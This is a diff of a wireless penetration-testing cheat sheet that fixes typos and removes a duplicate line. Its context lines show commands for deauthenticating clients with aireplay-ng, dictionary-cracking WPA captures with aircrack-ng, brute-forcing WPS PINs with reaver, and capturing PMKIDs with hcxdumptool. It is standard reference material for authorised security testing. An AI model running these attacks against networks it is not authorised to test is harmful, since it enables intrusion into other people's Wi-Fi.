@@ -19,7 +19,6 @@ aireplay-ng -0 1 -a $AP_MAC -c $VICTIM_MAC mon0
 
 # crack without john the ripper (-b <BSSID>)
 aircrack-ng -0 -w /pentest/passwords/john/password.lst wpajohn-01.cap
-aircrack-ng -0 -w /pentest/passwords/john/password.lst wpajohn-01.cap 
 aircrack-ng -w password.lst,secondlist.txt wpajohn-01.cap # multiple dicts
 
 # crack with john the ripper - combine mangling rules with aircrack
@@ -148,7 +147,7 @@ apt-get install reaver
 
 # Reaver integrated dumping tool (can also airodump-ng)
 # Wash gives information about WPS being locked or not
-# Locked WPS will have less success chances
+# Locked WPS will have less success chance
 wash -i mon0 
 
 # Launch Reaver
@@ -173,7 +172,7 @@ reaver -i <monitor interface> -b <bssid> -c <channel>  -p <PIN>
 reaver -i mon0 -c 6 -b 00:23:69:48:33:95  -vv -L -N -d 15 -T .5 -r 3:15
 ```
 
-> Message "WARNING: Detected AP rate limiting, waiting 315 seconds before re-trying" -> AP is protected Message "WARNING: Receive timeout occured" -> AP is too far
+> Message "WARNING: Detected AP rate limiting, waiting 315 seconds before re-trying" -> AP is protected Message "WARNING: Receive timeout occurred" -> AP is too far
 
 ## WPA PMKID Attack
 
@@ -184,7 +183,7 @@ INTERFACE=$(ifconfig | grep wlp | cut -d":" -f1) # mon0
 # Note: Based on the noise on the wifi channel it can take some time to receive the PMKID. 
 # It can take a while to capture PKMID (several minutes++)
 # We recommend running hcxdumptool up to 10 minutes before aborting.
-# If an AP recieves our association request packet and supports sending 
+# If an AP receives our association request packet and supports sending PMKID, it will be captured. 
 # sudo hcxdumptool -i wlan0mon -o outfile.pcapng --enable_status=1
 PMKID=$(sudo hcxdumptool -o test.pcapng -i $INTERFACE --enable_status  --filtermode=2)
 echo $PMKID|grep 'FOUND PMKID' &> /dev/null
